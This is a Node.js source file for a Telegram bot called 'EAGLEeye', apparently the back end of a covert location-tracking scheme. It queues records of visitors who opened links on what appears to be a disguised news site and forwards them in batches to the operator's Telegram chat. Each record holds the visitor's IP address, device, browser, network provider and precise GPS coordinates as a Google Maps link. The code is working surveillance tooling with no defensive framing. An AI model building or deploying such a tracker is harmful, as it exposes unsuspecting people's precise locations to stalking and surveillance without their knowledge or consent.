import TelegramBot from 'node-telegram-bot-api'
import assert from 'assert';
import dotenv from 'dotenv'
dotenv.config()


export const COMMAND_START = 'start'

export const trackMap = new Map()

const token = process.env.BOT_TOKEN
export const bot = new TelegramBot(token, 
	{ 
		polling: true
	})

export const trackMap_append = (chatid, delay, item = {}) => {
    const data = trackMap.get(chatid)
    if (!data) {
        trackMap.set(chatid, { chatid, delay, items: [item] })
    } else {
        data.items.push(item)
        data.delay = delay
    }

    return delay
}

export const trackMap_get = (chatid) => {
	return trackMap.get(chatid)
}

export const trackMap_remove = (chatid) => {
	trackMap.delete(chatid)
}

export const trackMap_clear = () => {
	trackMap.clear()
}

export const append = (json) => {

    if (json) {
        const delay = trackMap_append(json.chatid, json.delay, json.result)

        setTimeout(() => {
            track_notifier_thread(json.chatid)
        }
        , delay)
    }
}

export const track_notifier_thread = async (chatid) => {

    const data = trackMap_get(chatid)

    if (data && data.items.length > 0) {

        const date = new Date();

        let msg = ''
        let oneTimeMsgCount = 0
        while (data.items.length > 0) {

            const item = data.items[0]

            if (msg.length > 0) {
                msg += '\n\n'
            }

            msg += `👤 Got some location tracking
├ IP Address: ${item.ip_addr}
├ Browser: ${item.browser}
├ Device: ${item.device}
├ Location by IP: ${item.ip_loc}
├ Location by GPS: https://www.google.com/maps/search/${item.latitude},${item.longitude}
├ Provider: ${item.net_prov}
├ Date: ${item.date}
├ Link: https://trenwartaberita.com/news/read/${item.permalink}`

            data.items.splice(0, 1)

            oneTimeMsgCount++
            if (oneTimeMsgCount >= 10) {
                oneTimeMsgCount = 0
                sendMessage(chatid, msg)
                msg = ''
            }
        }

        if (msg.length > 0) {
            sendMessage(chatid, msg)
            msg = ''
        }
    }
}

const getWelcomeMessage = () => {

    return `Welcome the EAGLEeye Bot`
}

const procPrivateMessage = (message) => {

    let chatid = message.chat.id.toString();

	if (!message.text)
		return;

	let command = message.text;
	if (message.entities) {
		for (const entity of message.entities) {
			if (entity.type === 'bot_command') {
				command = command.substring(entity.offset, entity.offset + entity.length);
				break;
			}
		}
	}
 
    if (!command.startsWith('/')) {
        return
    }

    command = command.slice(1);

    if (command === COMMAND_START) {

        sendMessage(chatid, getWelcomeMessage())
    }
}

const procGroupMessage = (message) => {

}

bot.on('message', async (message) => {

	console.log(`========== message ==========`)
	console.log(message)
	console.log(`=============================`)

	const msgType = message?.chat?.type;
	if (msgType === 'private') {
		procPrivateMessage(message);

	} else if (msgType === 'group' || msgType === 'supergroup') {
		procGroupMessage(message);

	} else if (msgType === 'channel') {

	}
})

export const sendMessage = (chatid, message, enableLinkPreview = true) => {
	try {

		let data = { parse_mode: 'HTML' }

		if (enableLinkPreview)
			data.disable_web_page_preview = false
		else
			data.disable_web_page_preview = true

		data.disable_forward = true

		bot.sendMessage(chatid, message, data)

		return true
	} catch (error) {
		console.log('sendMessage', error)

		return false
	}
}